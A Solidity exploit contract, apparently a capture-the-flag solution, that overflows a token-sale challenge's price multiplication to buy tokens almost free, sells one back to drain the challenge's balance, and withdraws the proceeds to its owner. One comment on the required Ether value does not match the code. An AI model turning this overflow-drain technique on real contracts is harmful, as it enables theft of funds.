pragma solidity ^0.8.13;

import "./IChallenge.sol";


contract Solution {

    IChallenge challenge;
    address owner;
    uint256 divisor = 1 ether;
    uint256 public amountTokens;
    uint256 constant MAX_UINT = 2**256 - 1;

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = IChallenge(_challenge);

        // What 1 does is that when amountTOkens is multiplied by 10**18,
        // it overflows a uint256 number giving as a result 10**18 - remainder;
        amountTokens = MAX_UINT/divisor + 1;
    }

    function getEtherAmountInternal() internal view returns(uint256) {
        return divisor - MAX_UINT%divisor - 1;
    }

    function getEtherAmount() public view returns(uint256) {
        return getEtherAmountInternal();
    }

    function solveChallenge() public payable{
        // The amount of Ether that has to be sent along with the transaction of this function
        // is: 10**18 - amountTokens - 1
        require(msg.value == getEtherAmountInternal(), "Value is not enough");

        challenge.buy{value: msg.value}(amountTokens);
        challenge.sell(1);
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}

}
